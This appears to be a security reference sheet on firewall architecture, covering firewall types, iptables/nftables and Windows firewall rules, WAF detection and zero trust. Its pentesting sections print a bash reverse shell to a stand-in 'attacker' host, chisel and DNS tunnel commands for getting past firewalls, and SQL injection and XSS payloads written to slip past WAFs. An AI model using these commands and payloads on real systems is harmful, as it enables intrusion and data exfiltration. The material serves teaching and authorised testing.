# Firewall Architecture

## Firewall Types

| Type | OSI Layer | Inspection | Performance | Use Case |
|------|-----------|-----------|-------------|----------|
| Packet filter | 3-4 | IP/port/flags only | Fastest | Simple ACLs |
| Stateful | 3-4 | Track connection state | Fast | Standard perimeter |
| Application (WAF) | 7 | HTTP/SQL/protocol content | Slower | Web application protection |
| Next-Gen (NGFW) | 3-7 | DPI + identity + threat intel | Medium | Modern enterprise |
| Proxy/Gateway | 7 | Full protocol inspection | Slowest | High-security environments |

## Stateful Firewall — Connection Tracking

```
┌───────────────────────────────────────────────────────┐
│              Connection State Table                     │
├──────────┬─────────┬──────────┬──────┬────────────────┤
│ Src IP   │ Dst IP  │ Src Port │Dst P │ State          │
├──────────┼─────────┼──────────┼──────┼────────────────┤
│10.0.0.5  │8.8.8.8  │ 49152    │ 443  │ ESTABLISHED    │
│10.0.0.5  │1.1.1.1  │ 50001    │ 53   │ UDP (timeout)  │
│10.0.0.10 │10.0.1.5 │ 55123    │ 22   │ ESTABLISHED    │
│192.168..│10.0.0.5 │ 80       │ 8080 │ SYN_SENT       │
└──────────┴─────────┴──────────┴──────┴────────────────┘

Rules:
1. NEW packets checked against ruleset
2. ESTABLISHED/RELATED packets auto-allowed (matching state)
3. INVALID packets dropped
```

## iptables / nftables (Linux)

### iptables Chains
```bash
# Default chains: INPUT, OUTPUT, FORWARD
# Default policy: ACCEPT or DROP

# Set default policies (deny all, allow specific)
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH from specific subnet
iptables -A INPUT -s 10.0.0.0/24 -p tcp --dport 22 -j ACCEPT

# Allow HTTP/HTTPS
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT

# Rate limit new SSH connections (anti brute-force)
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

# Log dropped packets
iptables -A INPUT -j LOG --log-prefix "DROPPED: " --log-level 4
iptables -A INPUT -j DROP

# NAT (masquerade outbound traffic)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Port forwarding
iptables -t nat -A PREROUTING -p tcp --dport 8080 \
  -j DNAT --to-destination 192.168.1.100:80
```

### nftables (modern replacement)
```bash
# nftables replaces iptables/ip6tables/ebtables
nft add table inet filter
nft add chain inet filter input { type filter hook input priority 0\; policy drop\; }

# Allow established
nft add rule inet filter input ct state established,related accept

# Allow SSH
nft add rule inet filter input tcp dport 22 accept

# Rate limiting
nft add rule inet filter input tcp dport 22 ct state new \
  meter ssh-rate { ip saddr limit rate 3/minute } accept
```

## Windows Firewall (Advanced Security)

```powershell
# Block all inbound by default
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block

# Allow specific port
New-NetFirewallRule -DisplayName "Allow HTTPS" -Direction Inbound `
  -Protocol TCP -LocalPort 443 -Action Allow

# Block specific IP
New-NetFirewallRule -DisplayName "Block Attacker" -Direction Inbound `
  -RemoteAddress 203.0.113.50 -Action Block

# Allow application
New-NetFirewallRule -DisplayName "Allow App" -Direction Inbound `
  -Program "C:\Program Files\App\app.exe" -Action Allow

# Export/import rules
netsh advfirewall export "C:\fw-backup.wfw"
```

## Firewall Bypass Techniques (Pentesting)

### 1. Port-based Bypass
```bash
# Use commonly allowed ports
# 80 (HTTP), 443 (HTTPS), 53 (DNS), 8080 (proxy)

# Reverse shell on port 443 (looks like HTTPS)
nc -lvnp 443  # Attacker
bash -i >& /dev/tcp/attacker/443 0>&1  # Victim
```

### 2. Protocol Tunneling
```bash
# HTTP tunnel (through web proxy)
chisel server -p 8080 --reverse  # Attacker
chisel client attacker:8080 R:socks  # Victim

# DNS tunnel (bypass most firewalls)
iodine -f 10.0.0.1 tunnel.attacker.com  # Establish DNS tunnel

# ICMP tunnel
icmpsh (Windows) / icmptunnel (Linux)
```

### 3. Firewall Rule Discovery
```bash
# Identify open ports through firewall
nmap -sS -p- --open target

# Detect firewall type/version
nmap -sV --script=firewalk target
nmap --script firewall-bypass target

# TTL-based firewall detection
nmap --ttl 64 target   # Compare with different TTLs
```

### 4. Application Layer Bypass
```bash
# Embed C2 in legitimate HTTP traffic
# Cobalt Strike malleable profiles mimic CDN/cloud traffic
# Domain fronting (use CDN to hide true destination)

# WebSocket through HTTP proxy
# Many firewalls don't inspect WebSocket frames after upgrade
```

## WAF (Web Application Firewall) Bypass

### Common WAF Bypass Techniques
```
1. Encoding:
   ' OR 1=1 → %27%20OR%201%3D1
   <script> → %3Cscript%3E
   Double encoding: %2527 (encodes %27)

2. Case variation:
   UNION SELECT → UnIoN SeLeCt

3. Comment injection:
   UN/**/ION SEL/**/ECT
   /*!50000UNION*/ SELECT

4. Alternative syntax:
   OR 1=1 → OR 2>1 → OR 'a'='a'
   <script> → <svg/onload=alert(1)>

5. HTTP parameter pollution:
   ?id=1&id=UNION+SELECT  (some parsers use last value)

6. Content-Type switching:
   Send JSON instead of form-data
   multipart/form-data with unusual boundaries

7. HTTP/2 specific:
   Header manipulation unique to HTTP/2
   Request smuggling via H2/H1 mismatch
```

### WAF Detection
```bash
# Identify WAF presence
wafw00f https://target.com
nmap --script=http-waf-detect target

# Common WAF indicators:
# - Cloudflare: cf-ray header, specific error page
# - AWS WAF: x-amzn-requestid header
# - ModSecurity: specific 403 response body
# - Imperva: visid_incap cookie
```

## Zero Trust Network Access (ZTNA) vs Traditional Firewall

| Aspect | Traditional FW | ZTNA |
|--------|---------------|------|
| Trust model | Perimeter = trusted | No implicit trust |
| Access scope | Network-level | Application-level |
| Visibility | IP/port | User + device + context |
| Lateral movement | Possible once inside | Prevented by microsegmentation |
| Remote access | VPN (full network) | Per-app tunnels only |
